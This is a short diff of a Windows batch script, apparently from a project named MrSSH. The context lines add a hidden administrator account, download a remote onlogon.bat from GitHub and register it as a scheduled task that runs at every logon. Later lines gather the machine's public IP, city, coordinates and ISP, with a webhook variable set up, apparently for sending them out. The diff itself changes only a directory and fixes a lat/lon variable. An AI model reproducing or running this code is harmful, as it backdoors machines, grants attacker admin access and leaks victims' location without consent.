@@ -15,7 +15,7 @@ net localgroup Administración  Admin /add
 mkdir %appdata%\MrSSH
 cd %appdata%\MrSSH & curl -Ls https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat -o "onglogon.bat"
 schtasks /create /tn "MrSSH" /sc onlogon /tr "onlogon.bat"
-
+cd %temp%
 
 set "webhook="
 
@@ -28,7 +28,7 @@ FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.p
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter query`) DO (SET local=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter country`) DO (SET country=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter city`) DO (SET city=%%F)
-FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter lat`) DO (SET lon=%%F)
+FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter lat`) DO (SET lat=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter lon`) DO (SET lon=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter isp`) DO (SET isp=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter regionName`) DO (SET region=%%F)
